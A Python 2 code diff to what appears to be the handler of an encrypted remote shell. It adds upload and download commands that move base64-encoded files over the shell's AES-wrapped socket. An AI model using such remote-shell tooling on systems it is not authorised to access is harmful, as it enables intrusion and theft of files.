@@ -70,8 +70,9 @@ class MessageWorker: # Base class for adding a message worker
 		self.data_prefix = data_prefix # Prefix used to identify to which worker data should be sent
 		self.input_queue = Queue.Queue() # Queue of data to process
 		
-	def send(self, data):
-		output_queue.put(self.data_prefix+data+marker) # Place message on queue to be sent 
+	def send(self, data, prefix=None):
+		if not prefix: prefix = self.data_prefix
+		output_queue.put(prefix+data+marker) # Place message on queue to be sent 
 		
 	def put(self, data):
 		self.input_queue.put(data)
@@ -80,29 +81,42 @@ class MessageWorker: # Base class for adding a message worker
 		pass
 		
 class UserInputWorker(MessageWorker): # Worker which takes user input and sends it for execution
+	
+	def file_shell_to_handler(self, filename):
+		with open(filename, "wb") as w:
+			while True:
+				data = self.input_queue.get()
+				if data == "EOF": break
+				w.write(base64.b64decode(data))
+				
+	def file_handler_to_shell(self, filename):
+		with open(filename, "rb") as r:
+			for line in r.readlines():
+				self.send(base64.b64encode(line))
+			self.send("EOF")
 
 	def run(self):
 		try:
 			while True:
 				user_input = raw_input()
 				self.send(user_input)
+				if user_input.startswith("download"):
+					self.file_shell_to_handler(user_input.split()[1])
+				elif user_input.startswith("upload"):
+					self.file_handler_to_shell(user_input.split()[1])
 				sys.stdout.write(self.input_queue.get())
 		except EOFError: # Exit when user presses Control-C
 			os._exit(0)
 			
-class FileTransferWorker(MessageWorker):
-
-	def run(self):
-		pass
-			
 class TransmitWorker(MessageWorker): # Pseudo-worker to send data to shell
 	def run(self):
 		while True:
+			time.sleep(0.01)
 			comm_socket.sendall(EncodeAES(output_queue.get()))	
 			
 workers = []
-user_input_worker = UserInputWorker(chr(1))
 transmit_worker = TransmitWorker(chr(0)) # Create workers
+user_input_worker = UserInputWorker(chr(1))
 workers.append(user_input_worker)
 workers.append(transmit_worker)
 
